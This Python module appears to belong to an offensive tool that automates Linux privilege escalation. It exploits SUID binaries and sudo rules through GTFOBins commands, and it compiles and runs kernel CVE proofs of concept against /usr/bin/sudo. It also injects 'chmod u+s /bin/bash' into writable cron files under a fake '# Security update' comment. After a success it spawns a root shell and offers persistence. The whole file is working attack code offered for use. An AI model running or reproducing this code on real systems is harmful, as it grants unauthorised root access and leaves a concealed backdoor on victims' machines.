import subprocess
import os
import json
import sys
from datetime import datetime , timedelta
import time, select
from modules.logger import logger
from croniter.croniter import croniter
import pytz

# Add tools/gtfobins/ to the Python module search path.
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../../tools/gtfobins")))
from gtfo_parser import GTFOParser

from modules.json_api import JSONHandler

class Escalation:
    def __init__(self):
        # Instantiate the JSON handler and GTFOBins parser.
        self.json = JSONHandler()
        self.gtfo = GTFOParser()
        self.exploit_results = {}
        # Default payload for cron injection (if used).
        self.payload = "chmod u+s /bin/bash"
        

    def load_enum_data(self, json_path):
        """Load enumeration data from the provided JSON file."""
        logger.debug(f"[~] Loading enumeration data from {json_path}.")
        try:
            with open(json_path, "r") as f:
                data = json.load(f)
            logger.debug("[~] Enumeration data loaded successfully.")
            return data
        except Exception as e:
            logger.error(f"Failed to load enumeration data: {e}")
            return {}

    def get_exploit_vectors(self, enum_data):
        """
        Extract possible escalation vectors from the enumeration data.
        Vectors include SUID binaries, kernel exploits, and cron job misconfigurations.
        """
        logger.debug("[~] Extracting exploit vectors from enumeration data.")
        vectors = {
            "SudoPermissions": [],
            "SUID": [],
            "Kernel": [],
            "Cron": []
        }
        # SUID: include only binaries that actually exist on the system.
        if "SUID" in enum_data:
            vectors["SUID"] = [b for b in enum_data["SUID"] if os.path.exists(b)]
            logger.debug(f"[~] Found SUID vectors: {vectors['SUID']}\n")
        
        # SudoPermissions
        if "SudoPermissions" in  enum_data:
            vectors["SudoPermissions"] = [s for s  in enum_data["SudoPermissions"]]
            logger.debug(f"[~] Found SudoPermissions vectors: {vectors['SudoPermissions']}\n")

        # Kernel exploits (if any exist)
        if "Kernel" in enum_data and "Exploits" in enum_data["Kernel"]:
            vectors["Kernel"] = [e["CVE"] for e in enum_data["Kernel"]["Exploits"]]
            logger.debug(f"[~] Found Kernel exploit vectors: {vectors['Kernel']}\n")
        
        # Cron: flatten all cron jobs into a list of full file paths
        if "CronJobs" in enum_data:
            vectors["Cron"] = []
            for directory, jobs in enum_data["CronJobs"].items():
                for job in jobs:
                    if job == ".placeholder":
                        continue
                    if directory == "/etc/crontab":
                        if isinstance(job, dict):
                            vectors["Cron"].append(job["command"])
                    else:
                        vectors["Cron"].append(f"{directory}/{job}")
            logger.debug(f"[~] Found Cron job vectors: {vectors['Cron']}\n")

        
        return vectors
    
    def whoami(self, privtype, cmnd):
        result = {"status": "pending"}
        proc = subprocess.Popen(
            cmnd,
            shell=True,
            executable="/bin/bash",
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True,
            bufsize=1,
            start_new_session=True
        )

        # Allow the process a moment to initialize
        time.sleep(0.5)

        # Send the 'whoami' command into the spawned shell
        proc.stdin.write("whoami\n")
        proc.stdin.flush()

        # Use select to wait (non-blocking) for output for a certain timeout.
        timeout = 5  # seconds
        ready, _, _ = select.select([proc.stdout], [], [], timeout)
        if ready:
            output_line = proc.stdout.readline().strip()
            logger.debug(f"[~] Output from background shell: {output_line}")
            if "root" in output_line:
                result.update({
                    "status": "success",
                    "command": cmnd,
                    "shell_pid": proc.pid,
                    "verification": output_line
                })
                proc.stdin.write("chmod u+s /bin/bash\n")
                # subprocess.run(self.payload, shell=True, check=True)
                logger.info(f"[*] {privtype} exploit succeeded using command: {cmnd}")
            else:
                result.update({
                    "status": "failed",
                    "command": cmnd,
                    "verification": output_line
                })
                logger.error(f"{privtype} exploit did not yield a root shell, output: {output_line}")
        else:
            result.update({
                "status": "timeout",
                "command": cmnd
            })
            logger.warning(
                f"{privtype} exploit: No output received from spawned shell within {timeout} seconds"
            )

        return result

    def exploit_suid(self, binary_path):
        """
        Attempt to exploit a SUID binary using GTFOBins data. This function now spawns
        the root shell in the background and verifies the shell is running as root by
        sending a 'whoami' command.
        """
        binary_name = os.path.basename(binary_path)
        result = {"binary": binary_path, "status": "pending"}
        # logger.debug(f"Attempting SUID exploit for: {binary_path}")
        
        try:
            # Retrieve the exploit command for SUID exploitation.
            command = self.gtfo.get_suid_command(binary_name)
            if not command:
                result["status"] = "no_gtfobins_entry"
                logger.debug(f"No GTFOBins SUID entry for binary: {binary_name}")
                return result
            
            # Split the command into parts and remove the binary name
            command_parts = command.split()
            args = ' '.join(command_parts[1:]) if len(command_parts) > 1 else ''
            full_cmd = f"{binary_path} {args}".strip()
            
            logger.debug(f"[~] Executing SUID command (backgrounded): {full_cmd}")

            #spawn the shell in the background
            result =  self.whoami("SUID", full_cmd)
                
        except subprocess.TimeoutExpired:
            result.update({
                "status": "timeout",
                "command": full_cmd
            })
            logger.warning(f"SUID exploit timed out for {binary_path}")
        except Exception as e:
            result.update({
                "status": "failed",
                "error": str(e),
                "command": full_cmd
            })
            logger.error(f"SUID exploit failed for {binary_path}: {e}")

    
        
        return result


    def exploit_sudo(self, binary_path):
        """
        Attempt to exploit a sudo misconfiguration using GTFOBins data.
        Spawns a backgrounded root shell and verifies the shell is running as root by
        sending a 'whoami' command.
        """
        binary_name = os.path.basename(binary_path)
        result = {"binary": binary_path, "status": "pending"}
        logger.debug(f"[~] Attempting SUDO exploit for: {binary_path}")
        
        try:
            # Retrieve the sudo exploit command from the GTFOBins JSON.
            sudo_command = self.gtfo.get_sudo_command(binary_name)
            if not sudo_command:
                result["status"] = "no_gtfobins_entry"
                logger.debug(f"[~] No GTFOBins sudo entry for binary: {binary_name}")
                return result
            
            # Construct the full sudo command.
            full_cmd = f"{sudo_command}"
            logger.debug(f"[~] Executing SUDO command (backgrounded): {full_cmd}")
            # Spawn the shell in the background using subprocess.Popen
            result= self.whoami("SUDO" , full_cmd)
            

        
        except subprocess.TimeoutExpired:
            result.update({
                "status": "timeout",
                "command": full_cmd
            })
            logger.warning(f"SUDO exploit timed out for {binary_path}")
        except Exception as e:
            result.update({
                "status": "failed",
                "error": str(e),
                "command": full_cmd
            })
            logger.error(f"SUDO exploit failed for {binary_path}: {e}")
        
        return result

    
    


    def exploit_kernel(self, cve_data):
        """
        Compile the CVE PoC, run it (to hijack /usr/bin/sudo) in the background,
        then verify and record /tmp/sh as the single interactive root shell.
        """
        cve = cve_data["CVE"]
        result = {"cve": cve, "status": "pending"}

        # 1) locate project root
        module_dir  = os.path.dirname(__file__)
        project_root = os.path.abspath(os.path.join(module_dir, "..", ".."))
        src_path    = os.path.join(project_root, "tools", "exploits", f"{cve}.c")
        bin_path    = f"/tmp/{cve}"

        if not os.path.isfile(src_path):
            result["status"] = "exploit_not_available"
            logger.warning(f"[!] Kernel exploit not available for CVE: {cve}")
            return result

        # 2) compile
        compile_cmd = ["gcc", src_path, "-o", bin_path]
        logger.debug(f"[~] Compiling kernel exploit: {' '.join(compile_cmd)}")
        try:
            subprocess.run(compile_cmd, check=True)
        except subprocess.CalledProcessError as e:
            result.update({
                "status": "compilation_failed",
                "error": str(e)
            })
            logger.error(f"Failed to compile kernel exploit {cve}: {e}")
            return result

        # 3) background‑run the PoC against a known SUID (e.g. /usr/bin/sudo)
        target_suid = "/usr/bin/sudo"
        logger.info(f"⏳⏳⏳⏳ Running PoC for {cve} (backgrounded) → {target_suid} ⏳⏳⏳⏳")
        proc = subprocess.Popen(
            [bin_path, target_suid],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL
        )
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
            result.update({"status": "timeout"})
            logger.warning(f"Kernel PoC timed out for {cve}")
            return result

        # 4) verify that /tmp/sh now exists and is SUID
        sh = "/tmp/sh"
        if not (os.path.isfile(sh) and os.stat(sh).st_mode & 0o4000):
            result["status"] = "failed"
            logger.error(f"/tmp/sh missing or not SUID after {cve}")
            return result

        # 5) run your whoami helper against the new SUID shell
        verification = self.whoami("Kernel", sh)
        if verification.get("status") == "success":
            result.update({
                "status":    "success",
                "command":   sh,
                "shell_pid": verification.get("shell_pid"),
                "verification": verification.get("verification")
            })
            logger.info(f"[+] Kernel exploit succeeded for {cve}")
        else:
            result.update({
                "status":    "failed",
                "error":     "verification failed",
                "verification": verification.get("verification")
            })
            logger.error(f"Kernel exploit did not yield a root shell for {cve}")

        return result

    def _get_cron_paths(self, enum_data):
        """Extract full file paths or commands for cron jobs from the enumeration data."""
        cron_paths = []
        if "CronJobs" in enum_data:
            for directory, jobs in enum_data["CronJobs"].items():
                for entry in jobs:
                    # Skip placeholders
                    if isinstance(entry, str) and entry == ".placeholder":
                        continue
                    elif isinstance(entry, dict) and entry.get("filename") == ".placeholder":
                        continue

                    # # If the entry is a string
                    # if isinstance(entry, str):
                    #     if directory == "/etc/crontab":
                    #         # Split the cron line; tokens 0-4 are schedule, 5 is user, 6+ is actual file path.
                    #         parts = entry.split()
                    #         if len(parts) >= 7:
                    #             cron_paths.append(" ".join(parts[6:]))
                    #         else: #fallback if the format is unexpected
                    #             cron_paths.append(" ".join(parts[1:]))
                    #     else:
                    #         cron_paths.append(os.path.join(directory, entry))

                    # If the entry is stored as a dictionary
                    if isinstance(entry, dict):
                        if directory == "/etc/crontab":
                            #extract only the path after splitting and removing schedule and user parts
                            # command = entry.get("command", "")
                            # parts = command.split()
                            # if len(parts) >= 7:
                            #     cron_paths.append(" ".join(parts[6:]))
                            # else:
                            cron_paths.append(entry["command"])
                        else:
                            cron_paths.append(os.path.join(directory, entry.get("filename", "")))
        logger.debug(f"[~] Cron paths extracted: {cron_paths}")
        return cron_paths



    def _check_writable(self, path):
        """Return True if the file at 'path' is writable."""
        try:
            writable = os.access(path, os.W_OK)
            logger.debug(f"[~] Path {path} writable: {writable}")
            return writable
        except Exception as e:
            logger.error(f"Error checking writability for {path}: {e}")
            return False

    def _inject_cron_payload(self, cron_path , enum_data):
        """
        Attempt to inject a malicious payload into a writable cron file.
        Creates a backup and verifies the payload is present.
        """
        logger.debug(f"[~] Attempting cron payload injection for {cron_path}")
        try:
            if not self._check_writable(cron_path):
                logger.warning(f"Cron file not writable: {cron_path}")
                return {"status": "not_writable", "path": cron_path}
            
            with open(cron_path, "a") as f:
                f.write(f"\n# Security update\n{self.payload}\n")
            with open(cron_path, "r") as f:
                if self.payload in f.read():
                    logger.info(f"[Cron payload injection successful for {cron_path}")
                    # if injection is successful , it will calculate the cron schedule to be used further in waiting timer
                    
                    for job in enum_data.get("CronJobs", {}).get("/etc/crontab", []):
                        # job is a dictionary
                        if isinstance(job, dict) and job["command"] == cron_path:
                            self.cron_schedule = job["schedule"]
                            logger.debug(f"[~] Extracted cron schedule: {self.cron_schedule}")
                            break  # found a matching job, no need to continue
                    return {"status": "success", "path": cron_path}

            logger.error(f"Cron payload injection failed verification for {cron_path}")
            return {"status": "failed", "path": cron_path}
        except Exception as e:
            logger.error(f"Error during cron payload injection for {cron_path}: {e}")
            return {"status": "error", "path": cron_path, "error": str(e)}

    def exploit_cron(self, enum_data):
        """
        Iterate over all discovered cron jobs and attempt payload injection.
          Returns a dict with:
          - status: 'success' if any path succeeded, else 'failed'
          - details: map of path -> {status, ...}
        """
        logger.debug("[~] Starting cron exploitation process.")
        try:
            full_cmd = "/bin/bash -p"
            details = {}
            cron_paths = self._get_cron_paths(enum_data)
            for path in cron_paths:
                # 1) skip missing files
                if not os.path.exists(path):
                    details[path] = {"status": "not_found"}
                    logger.warning(f"Cron path not found: {path}")
                    continue
                # 2) Inject Payload
                result = self._inject_cron_payload(path , enum_data)
                details[path] = result

                #3) if injection failed , move to the next path
                if result.get("status") != "success":
                    continue
                # 4) calculating schedule and trying to exploit cronjob
                schedule = getattr(self, "cron_schedule", None)
                if not schedule:
                    logger.error("No cron schedule found; skipping wait.")
                else:
                    next_run = self.resolve_schedule(schedule)
                    time_diff = (next_run - datetime.now()).total_seconds()
                    while time_diff > 0:
                        print(f"⏳⏳⏳⏳ Time remaining: {int(time_diff)} seconds for cron to run… ⏳⏳⏳⏳ " , end="\r")
                        time.sleep(1) #wait for 1 second
                        time_diff -=1 # decrease by 1 second

                print("\nCron job execution time is over. Checking for setuid...")

                    # Check if the cron job executed successfully and setuid was applied
                if self.check_setuid_bit("/bin/bash"):
                    logger.info("Cron job executed successfully; checking shell…")
                    cron_res = self.whoami("Cronjob", full_cmd)
                    details[path] = cron_res
                    # stop on the first path that worked
                    if cron_res.get("status") == "success":
                        break
                
                else:
                    continue

            
        except subprocess.TimeoutExpired:
            logger.warning(f"Cronjob exploit timed out for {path}")
            return {"status": "timeout", "details": details}

            
        except Exception as e:
            result.update({
                "status": "failed",
                "error": str(e),
                "command": full_cmd
            })
            logger.error(f"Cronjob exploit failed for {path}: {e}")

            
         # decide overall status
        overall = "success" if any(r.get("status") == "success" for r in details.values()) else "failed"
        return {"status": overall, "details": details}
    
    CRON_ALIAS_MAP = {
    "@reboot":   None,              # treat as “run immediately”
    "@yearly":   "0 0 1 1 *",
    "@annually": "0 0 1 1 *",
    "@monthly":  "0 0 1 * *",
    "@weekly":   "0 0 * * 0",
    "@daily":    "0 0 * * *",
    "@hourly":   "0 * * * *",
    }

    def resolve_schedule(self,schedule_str: str) -> datetime:
        """
        Given a cron schedule string (either numeric or @alias),
        return the next run datetime.
        """
        now = datetime.now()
        if schedule_str.startswith("@"):
            numeric = Escalation.CRON_ALIAS_MAP.get(schedule_str)
            if numeric is None:
                # @reboot: run immediately
                logger.info("Cron will be run at the next reboot")
                return now
            schedule_str = numeric
        # numeric 5-field expression
        return croniter(schedule_str, now).get_next(datetime)
    
    def get_next_cron_time(self,cron_expression):
        """
        Get the next execution time for the cron expression.
        """
        base_time = datetime.now()
        cron = croniter(cron_expression, base_time)
        next_run = cron.get_next(datetime)  # Get the next execution time as a datetime object
        return next_run

    def check_setuid_bit(self, file_path):
        """
        Check if the setuid bit is set on a file.
        
        :param file_path: The path of the file to check (e.g., '/bin/bash').
        :return: True if setuid bit is set, False otherwise.
        """
        try:
            # Get the file status
            file_stat = os.stat(file_path)
            
            # Check if the setuid bit is set using the file's mode
            # The setuid bit is in the 4th octal digit (S_ISUID)
            if file_stat.st_mode & 0o4000:
                logger.info(f"Setuid bit is set on {file_path}")
                return True
            else:
                logger.info(f"Setuid bit is NOT set on {file_path}")
                return False
        except Exception as e:
            logger.error(f"Error checking setuid bit on {file_path}: {e}")
            return False

    def manual_escalate(self, enum_json_path):
        """
        Manual mode: user selects vectors interactively.
        """
        enum_data = self.load_enum_data(enum_json_path)
        vectors = self.get_exploit_vectors(enum_data)

        menu = {
            "1": ("SUID", vectors.get("SUID", [])),
            "2": ("SudoPermissions", vectors.get("SudoPermissions", [])),
            "3": ("Kernel", enum_data.get("Kernel", {}).get("Exploits", [])),
            "4": ("Cron", vectors.get("Cron", [])),
        }

        while menu:
            print("\nChoose an attack vector to try:")
            for opt, (name, items) in menu.items():
                print(f"  {opt}) {name}  ({len(items)} candidates)")
            choice = input("Your choice (or Q to quit): ").strip().upper()
            if choice == "Q":
                print("[*] Aborting manual escalation.")
                return

            if choice not in menu:
                print("[*] Invalid choice, try again.")
                continue

            vector_name, items = menu.pop(choice)
            print(f"\n[*] Attempting {vector_name} exploits...")
            success = False

            if vector_name == "SUID":
                for binpath in items:
                    res = self.exploit_suid(binpath)
                    self.exploit_results[binpath] = res
                    if res.get("status") == "success":
                        success = True
                        break

            elif vector_name == "SudoPermissions":
                for spec in items:
                    res = self.exploit_sudo(spec)
                    self.exploit_results[spec] = res
                    if res.get("status") == "success":
                        success = True
                        break

            elif vector_name == "Kernel":
                for cve in items:
                    res = self.exploit_kernel(cve)
                    self.exploit_results[cve["CVE"]] = res
                    if res.get("status") == "success":
                        success = True
                        break

            elif vector_name == "Cron":
                cron_res = self.exploit_cron(enum_data)
                self.exploit_results["cron"] = cron_res
                if cron_res.get("status") == "success":
                    success = True

            if success:
                print(f"[+] {vector_name} succeeded!")
                break
            else:
                print(f"[-] {vector_name} failed. Pick another vector.")
        self.save_escalation_results(enum_data)
        if self.success_check():
            # Save results before spawning shell
            
            logger.info("✅ Privilege escalation successful!")
            
            logger.info("SUID is now set on /bin/bash , you can run it with '/bin/bash -p' command anytime")
            self._post_exploit_shell_and_persistence()
        else:
            print("[!] All manual vectors failed.")

    def _post_exploit_shell_and_persistence(self):
        """
        Spawn the interactive root shell from the first successful exploit,
        then optionally write its PID to JSON for the Persistence module.
        """
        # find the successful command & PID
        exploited_cmd = None
        shell_pid     = None

        # 1) direct (SUID/SUDO/Kernel)
        for res in self.exploit_results.values():
            if isinstance(res, dict) and res.get("status") == "success" and "command" in res:
                exploited_cmd = res["command"]
                shell_pid     = res.get("shell_pid")
                break

        # 2) cron fallback
        if not exploited_cmd and "cron" in self.exploit_results:
            cron_res = self.exploit_results["cron"]
            for detail in cron_res.get("details", {}).values():
                if detail.get("status") == "success" and "command" in detail:
                    exploited_cmd = detail["command"]
                    shell_pid     = detail.get("shell_pid")
                    break

        if not exploited_cmd:
            logger.error("No successful exploit to spawn shell from.")
            return

        # 3) persistence prompt
        choice = input("[+] Set up persistence? (Y/N): ").strip().lower()
        while choice not in ("y","n"):
            choice = input("Please enter Y or N: ").strip().lower()

        data = self.json.read_json()            # read existing
        data["persistence"] = {
            "requested": choice == "y",
            "exploit_command": exploited_cmd,
            "root_shell_pid": shell_pid if choice == "y" else None,
            "timestamp": datetime.now().isoformat()
        }
        self.json.write_json(data)
        logger.debug(f"[~] Persistence requested? {data['persistence']['requested']}")

        persist_cfg = data.get("persistence", {})

        if persist_cfg.get("requested") == False:
            logger.info(f"Spawning root shell: {exploited_cmd}")
            subprocess.run(exploited_cmd, shell=True)



    def execute_escalation(self, enum_json_path):
        """
        Main escalation flow with automatic ordering.
        """
        enum_data = self.load_enum_data(enum_json_path)
        vectors = self.get_exploit_vectors(enum_data)

        # --- Attempt SUID exploitation ---
        if vectors.get("SUID"):  
            for binpath in vectors["SUID"]:
                logger.info(f"[*]Trying SUID exploit on: {binpath}")
                result = self.exploit_suid(binpath)
                self.exploit_results[binpath] = result
                if result.get("status") == "success":
                    break

        # --- Attempt SUDO exploitation ---
        if not self.success_check() and vectors.get("SudoPermissions"):  
            for spec in vectors["SudoPermissions"]:
                logger.info(f"[*]Trying SUDO exploit on: {spec}")
                result = self.exploit_sudo(spec)
                self.exploit_results[spec] = result
                if result.get("status") == "success":
                    break

        # --- Attempt kernel exploits ---
        if not self.success_check() and enum_data.get("Kernel", {}).get("Exploits"):  
            for cve in enum_data["Kernel"]["Exploits"]:
                logger.info(f"[*]Trying kernel exploit for CVE: {cve['CVE']}")
                result = self.exploit_kernel(cve)
                self.exploit_results[cve["CVE"]] = result
                if result.get("status") == "success":
                    break

        # --- Attempt cron injection ---
        if not self.success_check():
            logger.info("[*]Attempting cron injection.")
            result = self.exploit_cron(enum_data)
            self.exploit_results["cron"] = result

        # --- Save results and continue ---
        self.save_escalation_results(enum_data)
        if self.success_check():
            logger.info("✅ Privilege escalation successful!")
            logger.info("SUID is now set on /bin/bash , you can run it with '/bin/bash -p' command anytime")
            self._post_exploit_shell_and_persistence()
        else:
            print("[!] Privilege Escalation failed.")

    def save_escalation_results(self, enum_data):
        """
        Consolidate and save escalation results to keep3rs.json.
        """
        # Group results by vector type
        grouped = {"SUID": {}, "SudoPermissions": {}, "Kernel": {}, "cron": {}}
        for key, result in self.exploit_results.items():
            if key in enum_data.get("SUID", []):
                grouped["SUID"][key] = result
            elif key in enum_data.get("SudoPermissions", []):
                grouped["SudoPermissions"][key] = result
            elif key in [cve.get("CVE") for cve in enum_data.get("Kernel", {}).get("Exploits", [])]:
                grouped["Kernel"][key] = result
            elif key == "cron":
                grouped["cron"] = result

        payload = {
            "escalation_attempts": grouped,
            "successful_escalation": self.success_check()
        }
        # Write to keep3rs.json
        self.json.write_json(payload)
        

    def success_check(self):
        """
        Return True if any top-level entry in self.exploit_results has a status of 'success'.
        """
        return any(
            isinstance(v, dict) and v.get("status") == "success"
            for v in self.exploit_results.values()
        )